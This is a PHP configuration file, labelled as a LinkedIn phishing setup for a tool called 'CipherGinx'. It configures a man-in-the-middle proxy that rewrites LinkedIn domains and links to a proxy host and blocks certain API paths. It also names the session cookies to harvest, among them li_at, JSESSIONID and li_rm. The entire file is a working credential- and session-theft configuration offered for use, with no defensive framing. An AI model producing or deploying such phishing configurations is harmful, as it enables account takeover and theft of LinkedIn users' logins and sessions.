<?php
// CipherGinx PHP - LinkedIn Phishing Configuration
// Targets LinkedIn login and session capture

return [
    'hostname' => 'linkedin.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['www.linkedin.com', 'localhost'],
        ['linkedin.com', 'localhost'],
        ['api.linkedin.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/login-submit', ['X-Requested-With' => 'XMLHttpRequest']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://www.linkedin.com', 'https://localhost'],
        ['', 'https://linkedin.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/voyager/api/graphql',
        '/voyager/search',
        '/voyager/identity',
    ],

    'get_cookie' => [
        'JSESSIONID',
        'li_at',
        'li_rm',
        '__Host-li_atsessionid',
        'UserMatchHistory',
        'AnalyticsSessionID',
        'lidc',
        'bcookie',
        'bscookie',
    ],
];
